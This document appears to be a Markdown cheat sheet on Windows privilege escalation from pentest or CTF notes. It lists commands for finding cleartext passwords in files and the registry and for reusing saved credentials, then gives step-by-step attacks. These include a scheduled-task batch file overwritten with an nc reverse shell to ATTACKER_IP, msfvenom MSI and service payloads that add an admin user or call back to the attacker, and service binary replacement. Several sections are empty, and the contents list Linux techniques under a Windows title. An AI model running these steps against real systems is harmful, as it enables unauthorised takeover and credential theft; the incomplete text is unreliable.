# Windows Privilege Esclations

## Table of contents

##### ➤ Internal Enumeration
* [1. Manual enumeration](#Manual-enumeration)
* [2. Search Cleartext Passwords](#Search-cleartext-passwords)
* [3. Automated tools](#Automated-enumeration)
* [4. Bloodhound](#Bloodhound-enumeration)

##### ➤ Privilege escalation through misconfigurations

* [1. Scheduled tasks method](#Scheduled-tasks-method)
* [2. AlwaysInstallElevated method](#AlwaysInstallElevated-method)
* [3. Insecure permissions on service executable method](#Insecure-permissions-on-service-executable-method)
* [4. Unquoted service paths method](#Unquoted-service-paths-method)
* [5. Insecure service permissions method](#Insecure-service-permissions-method)
* [6. Crontab method](#crontab-method)
* [7. PATH method](#path-method)
* [8. NFS method](#nfs-method)


##### ➤ Privilege escaltion through exploits

* [1. Kernel exploit](#Kernel-exploit)
* [2. Dirty Cow](#dirtycow-exploit)


``` ```
``` ```
## Manual enumeration

##### ➤ Who
```
whoami
echo %username%
whoami /priv
```

##### ➤ Users and groups
```
➤ What users/localgroups are on the machine?
net users
net localgroups

➤ More info about a specific user. Check if user has privileges.
net user user1

➤ View Domain Groups
net group /domain

➤ View Members of Domain Group
net group /domain {Group Name}
```

##### ➤ System info
```
systeminfo
ver
hostname
```

##### ➤ Patch on the system
```
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

##### ➤ Network
```
ipconfig /all
route print
arp -A
```

##### ➤ Firewall
```
netsh firewall show state
netsh firewall show config
```

##### ➤ Vulnerable Drivers
```
Some driver might be vulnerable
driverquery
```

##### ➤ Detecte if Windows Defender is enabled on the machine (powershell command)
```
get-item 'hklm:\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection\'
```

##### ➤ Search a specific filename
```
dir /b/s proof.txt
```

``` ```
``` ```
## Search Cleartext Passwords

##### ➤ Basic search
```
findstr /si password *.txt
findstr /si password *.xml
findstr /si password *.ini

# Find all those strings in config files.
dir /s *pass* == *cred* == *vnc* == *.config*

# Find all passwords in all files.
findstr /spin "password" *.*
findstr /spin "password" *.*
```

##### ➤ Powershell history
```
➤ Using cmd
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

➤ Using powershell
type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

##### ➤ Saved Windows Credentials
```
➤ List saved credentials
C:\Users\Kiosec>cmdkey /list
Currently stored credentials:

    Target: Domain:interactive=WINPRIVESC\admin
    Type: Domain Password
    User: WINPRIVESC\admin
    
➤ Use credentials founded
C:\Users\kiosec> runas /savecred /user:admin cmd.exe
```

##### ➤ Usual Windows standard file
```
C:\sysprep.inf
C:\sysprep\sysprep.xml
C:\Unattend.xml
%WINDIR%\Panther\Unattend\Unattended.xml
%WINDIR%\Panther\Unattended.xml
C:\Windows\Panther\
C:\Windows\Panther\Unattend\
C:\Windows\System32\
C:\Windows\System32\sysprep\
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml

dir c:\*vnc.ini /s /b
dir c:\*ultravnc.ini /s /b 
dir c:\ /s /b | findstr /si *vnc.ini
```

##### ➤ Specific tools
```
➤ VNC
reg query "HKCU\Software\ORL\WinVNC3\Password"

➤ Windows autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

➤ SNMP Paramters
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"

➤ Putty
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```

##### ➤ Search for password in registry
```
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

##### ➤ IIS Configuration
```
➤ IIS configuration file
C:\inetpub\wwwroot\web.config
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config

➤ Using powershell/cmd 
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```

``` ```
``` ```
## Automated enumeration

##### ➤ Winpeas.exe :
https://github.com/carlospolop/PEASS-ng/releases/tag/20220220


``` ```
``` ```
## Bloodhound enumeration

##### ➤ Install Bloodhound GUI
```
https://www.kalilinux.in/2021/01/install-bloodhound-on-kali-linux.html
```
##### ➤ Install Bloodhound-python
```
pip3 install bloodhound
```
##### ➤ Let's use bloodhound to visualise the domain and look for privilege escalation paths
```
bloodhound-python -d <DOMAIN> -u <USERNAME> -p <PASSWORD> -gc <COMPUTERNAME>.<DOMAIN> -c all -ns 10.0.0.1
→ EX:  bloodhound-python -d example.local -u svc-admin -p s3rvice -gc laptop01.example.local -c all -ns 10.0.0.1
```
##### ➤ Upload the JSON file into Bloodhound GUI



``` ```
``` ```
## Scheduled tasks method

##### ➤ Step 01 : Scheduled tasks can be listed from the command line using the schtasks command without any options. 
```
C:\Users\kiosec> schtasks
Folder: \
TaskName                                 Next Run Time          Status
======================================== ====================== ===============
vulnerable_scheduled_task                N/A                    Ready

Folder: \Microsoft
TaskName                                 Next Run Time          Status
======================================== ====================== ===============
INFO: There are no scheduled tasks presently available at your access level.

Folder: \Microsoft\Windows
TaskName                                 Next Run Time          Status
======================================== ====================== ===============
Server Initial Configuration Task        N/A                    Disabled

Folder: \Microsoft\Windows\.NET Framework
TaskName                                 Next Run Time          Status
======================================== ====================== ===============
.NET Framework NGEN v4.0.30319           N/A                    Ready
.NET Framework NGEN v4.0.30319 64        N/A                    Ready
.NET Framework NGEN v4.0.30319 64 Critic N/A                    Disabled
.NET Framework NGEN v4.0.30319 Critical  N/A                    Disabled
```

##### ➤ Step 02 : To retrieve detailed information about any of the services, you can use a command like the following one:
```
C:\Users\kiosec> schtasks /query /tn vulnerable_scheduled_task /fo list /v
Folder: \
HostName:                             WINPRIVESC
TaskName:                             \vulnerable_scheduled_task
Task To Run:                          C:\tasks\schtask.bat
Run As User:                          admin
```

**Note :** "Task to Run" parameter which indicates what gets executed by the scheduled task, and the "Run As User" parameter, which shows the user that will be used to execute the task. If our current user can modify or overwrite the "Task to Run" executable, we can control what gets executed by the admin user, resulting in a simple privilege escalation. 

##### ➤ Step 03 : Check the file permissions on the executable
```
C:\Users\kiosec> icacls c:\tasks\schtask.bat
c:\tasks\schtask.bat NT AUTHORITY\SYSTEM:(I)(F)
                    BUILTIN\Administrators:(I)(F)
                    BUILTIN\Users:(I)(F)
```

**Note :** As can be seen in the result, the BUILTIN\Users group has full access (F) over the task's binary. This means we can modify the .bat file and insert any payload we like.

##### ➤ Step 04 : Overwrite the vulnerable .bat file and insert a payload (ex: reverse shell)
```
C:\Users\kiosec> echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 443 > C:\tasks\schtask.bat
```

##### ➤ Step 05 : Waiting the next time the scheduled task is triggered

##### ➤ Step 05 BIS : Manually run the task (Probably wouldn't be able to start the task in a real scenario)
```
C:\Users\kiosec> schtasks /run /tn vulnerable_scheduled_task
```

``` ```
``` ```
## AlwaysInstallElevated method

AlwaysInstallElevated is a setting that allows non-privileged users the ability to run Microsoft Windows Installer Package Files (MSI) with elevated (SYSTEM) permissions.

##### ➤ 1. check the values of these two registry entries (all need to be on 0x1)
```
C:\Users\kiosec> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
C:\Users\kiosec> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

Output: AlwaysInstallElevated   REG_DWORD   0x1
```

##### ➤ 2. Generate a MSI file which add our user in the Local Administrators group
```
msfvenom -p windows/adduser USER=lexis PASS=mypassword123! -f msi -o exploit.msi
```

##### ➤ 2 Bis. Generate a MSI file which execute a reverse shell
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi
```

##### ➤ 3. Upload the MSI file on the victim

##### ➤ 4. Executre the MSI file
```
msiexec /quiet /qn /i C:\Users\victim\Downloads\exploit.msi
```

**Note :**
- /quiet = Suppress any messages to the user during installation
- /qn = No GUI
- /i = Regular (vs. administrative) installation
  
##### ➤ 5. Verify that our user has been added in the localgroup Administrators (main scenario)
```
net localgroup Administrators
```

``` ```
``` ```
## Insecure permissions on service executable method

If the executable associated with a service has weak permissions that allow an attacker to modify or replace it, the attacker can gain the privileges of the service's account trivially.

##### ➤ 1. List the services 
```
```

##### ➤ 2. Query a specific service configuration 
```
C:\Users\kiosec> sc qc vulnerable_service
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: vulnerable_service
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\PROGRA~2\SYSTEM~1\VService.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : System Scheduler Service
        DEPENDENCIES       :
        SERVICE_START_NAME : .\svcadmin
```

**Note :** PowerShell has sc as an alias to Set-Content, therefore you need to use sc.exe in order to control services with PowerShell this way.

##### ➤ 3. Check the permissions on the executable associated to the service (Binary_Path_Name)
```
C:\Users\kiosec>icacls C:\PROGRA~2\SYSTEM~1\VService.exe
C:\PROGRA~2\SYSTEM~1\VService.exe Everyone:(I)(M)
                                  NT AUTHORITY\SYSTEM:(I)(F)
                                  BUILTIN\Administrators:(I)(F)
                                  BUILTIN\Users:(I)(RX)
                                  APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                  APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
```

**Note :** The Everyone group has modify permissions (M) on the service's executable. This means we can simply overwrite it with any payload of our preference, and the service will execute it with the privileges of the configured user account.

##### ➤ 4. Generate an exe-service payload using msfvenom (reverse shell)
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f exe-service -o reverse-shell.exe
```

##### ➤ 5. Upload the reverse shell on the victim's asset

##### ➤ 6. Create the listener on the attacker's asset

##### ➤ 7. Replace the service executable with our payload

**Note :** Since we need another user to execute our payload, we'll want to grant full permissions to the Everyone group.

```
C:\Users\kiosec> cd C:\PROGRA~2\SYSTEM~1\

C:\PROGRA~2\SYSTEM~1> move VService.exe VService.exe.bkp
        1 file(s) moved.

C:\PROGRA~2\SYSTEM~1> move C:\Users\thm-unpriv\reverse-shell.exe VService.exe
        1 file(s) moved.

C:\PROGRA~2\SYSTEM~1> icacls VService.exe /grant Everyone:F
        Successfully processed 1 files.
```

 ##### ➤ 8. Restart the service

**Note :** in a normal scenario, you would likely have to wait for a service restart

```
C:\Users\kiosec> sc stop windowsscheduler
C:\Users\kiosec> sc start windowsscheduler
```

``` ```
``` ```
## Unquoted service paths method
```
➤ 0. Explanation
Windows would try to locate and execute programs in the following order:
```
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

➤ 1. Find Services With Unquoted Paths
• Using sc
```
sc query
sc qc service name
```
• Using 
```
Using WMIC
```

➤ 2. Look for Binary_path_name (Binary with space) and for each of them, check if the path is unquoted ('').
Vulnerable example: C:\Program Files\Some Folder\Service.exe

➤ 3. Verify that we can write into one of the subfolder
```
icacls "C:\Program Files\Some Folder\"
```

➤ 4. Create a reverse shell named Some.exe in 'C:\Program Files\Some Folder\'

➤ 5. Restart the service linked with service.exe
```
sc stop vulnerable_service
sc start vulnerable_service
```

``` ```
``` ```
## Insecure service permissions method
```
```
